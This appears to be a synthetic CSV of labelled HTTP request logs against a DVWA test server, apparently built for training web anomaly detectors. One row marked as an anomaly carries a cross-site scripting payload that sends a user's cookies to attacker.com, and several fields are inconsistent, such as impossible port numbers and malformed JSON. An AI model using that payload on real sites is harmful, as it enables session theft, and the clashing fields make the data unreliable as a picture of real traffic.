timestamp,agent,method,request_body,request_headers,request_url,response_body,response_headers,response_size,source_ip,source_port,status,target_ip,target_port,157,user_identity,anomaly
2023/7/19 14:01,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/exec/; Content-Length:109; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /sales?category=shoes&startDate=2021-01-01&endDate=2021-12-31,"{""salesId"": 12;""category"": ""shoes"";""salesAmount"": 15000.00;}","Date:Wed, 19 Jul 2023 06:01:25 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4382; Content-Type:text/html;charset=utf-8;",817,  172.21.34.65,81489,200,  10.62.10.59,112,560,user,normal
2023/7/19 14:02,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {""name"": ""John"";""email"": ""john@example.com"";""password"": ""unsafe-password""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /users,"{""success"": true; ""userId"": 987}","Date:Wed, 19 Jul 2023 06:02:20 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4456; Content-Type:text/html;charset=utf-8;",220,  192.168.135.71,56649,200,  10.26.40.155,80,174,user,normal
2023/7/19 14:06,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,POST,"{""userId"": ""user567"", ""sharedById"": ""user890"";""password"":""whatAfanstsic""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/brute/; Content-Length:81; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,/beSharedItems,"{""userId"": ""user567"", ""sharedById"": ""user890"", ""id"": 125}","Date:Wed, 19 Jul 2023 06:06:56 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:4653; Content-Type:text/html;charset=utf-8;",1003,192.168.135.71,54144,200,10.26.40.155,80,465,user,anomaly
2023/7/19 14:46,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, DELETE,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/upload/; Content-Length:115; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /clients/ad123,"{""clientId"": ""clt101"";""addressId"": ""ad123"";""streetNumber"": ""345"";""streetName"": ""Main Street"";""city"": ""Springfield"";""state"": ""AZ"";""zip"": ""85254""}","Date:Wed, 19 Jul 2023 06:46:02 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:5022; Content-Type:text/html;charset=utf-8;",405,  192.168.135.71,54955,200,  10.26.40.155,80,600,admin,normal
2023/7/19 13:55,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, POST," {""rating"": 4; ""review"": ""This product was good but could be better.""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/login.php; Content-Length:112; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /products/review/145,"{""rating"": 4; ""review"": ""This product was good but could be better.""; ""userId"": ""user4563""; ""productId"": 145; ""id"": 987}","Date:Wed, 19 Jul 2023 05:55:59 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Location:login.php; Content-Length:134; Content-Type:text/html; charset=UTF-8;",200,  192.168.0.39,51992,200,  10.12.30.170,80,208,user,normal
2023/7/19 14:19,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr,POST,"{""itemId"": ""item789"";""productName"": ""Product C"";""price"": 49.99}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/vulnerabilities/open_redirect/source/impossible.php?redirect=1; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,/collections?input=<script>document.location='http://attacker.com?data='+document.cookie</script>,"{""itemId"": ""item789"";""productName"": ""Product C"";""price"": 49.99}","Date:Wed, 19 Jul 2023 05:51:53 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Thu, 19 Nov 1981 08:52:00 GMT; Cache-Control:no-store, no-cache, must-revalidate, post-check=0, pre-check=0; Pragma:no-cache; Content-Length:162; Connection:close; Content-Type:text/html; charset=UTF-8;",118,192.168.135.71,52784,201,10.26.40.155,80,760,user,anomaly
2023/7/19 14:01,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, GET," {""category"": ""Outdoors""}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /products/outdoors,"[""Garden Hose; ""Gardening Tools; ""Lawn Mower; ""BBQ Grill Set""]","Date:Wed, 19 Jul 2023 06:01:34 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; Location:http://10.26.40.155/dvwa/vulnerabilities/xss_s/; Content-Length:255; Content-Type:text/html; charset=iso-8859-1;",302,  192.168.135.71,53189,200,  10.26.40.155,80,234,user,normal
2023/7/19 14:28,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, PUT," {""quantity"": 10}",Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Content-Type:application/x-www-form-urlencoded; Referer:http://10.26.40.155/dvwa/vulnerabilities/weak_id/; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible; Content-Length:36;,  /shoppingCart/user123/item123,"{""cartItemId"": ""item123""; ""productId"": ""product123""; ""quantity"": 10}","Date:Wed, 19 Jul 2023 06:28:20 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Set-Cookie:dvwaSession=b883e469a0917ebd003007f6c2832a0c0c3f1c8b; expires=Wed, 19-Jul-2023 07:28:20 GMT; path=/vulnerabilities/weak_id/; domain=10.26.40.155; secure; httponly; Content-Length:3582; Content-Type:text/html;charset=utf-8; dvwaSession:b883e469a0917ebd003007f6c2832a0c0c3f1c8b;  expires:Wed, 19-Jul-2023 07:28:20 GMT;  path:/vulnerabilities/weak_id/;  domain:10.26.40.155;  secure; httponly: ;",653,  192.168.135.71,52843,200,  10.26.40.155,80,279,user,normal
2023/7/19 14:02,Mozilla/5.0 (Windows NT 10.0; WOW64; x64; rv:105.0esr) Gecko/20010101 Firefox/105.0esr, DELETE,  nan,Host:10.26.40.155; Pragma:no-cache; Cache-Control:no-cache; Referer:http://10.26.40.155/dvwa/logout.php; Cookie:PHPSESSID=aoapp5r7s63olpi0dp254p4j77; security=impossible;,  /cart/item/item1001, nan,"Date:Wed, 19 Jul 2023 06:02:25 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; X-Powered-By:PHP/5.4.16; Expires:Tue, 23 Jun 2009 12:00:00 GMT; Cache-Control:no-cache, must-revalidate; Pragma:no-cache; Content-Length:1627; Content-Type:text/html;charset=utf-8;",204,  192.168.135.87,54500,302,  10.26.40.199,80,125,user,normal
2023/7/19 14:51,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0, GET,  nan,"Host:10.26.40.155; Accept:text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8; Accept-Language:zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2; Connection:keep-alive; Upgrade-Insecure-Requests:1; Sec-Fetch-Dest:document; Sec-Fetch-Mode:navigate; Sec-Fetch-Site:none; Sec-Fetch-User:?1;",  /order/090,"{""userId"": ""user090"";""orderId"": ""123"";""items"": [{""itemId"": ""123"";""quantity"": 2 }];""status"": ""Shipped""}","Date:Wed, 19 Jul 2023 06:51:27 GMT; Server:Apache/2.4.6 (CentOS) PHP/5.4.16; Location:http://10.26.40.155/dvwa/; Content-Length:233; Keep-Alive:timeout=5, max=10; Connection:Keep-Alive; Content-Type:text/html; charset=iso-8859-1;",187,  192.168.135.71,55631,200,  10.26.40.155,80,236,user,normal
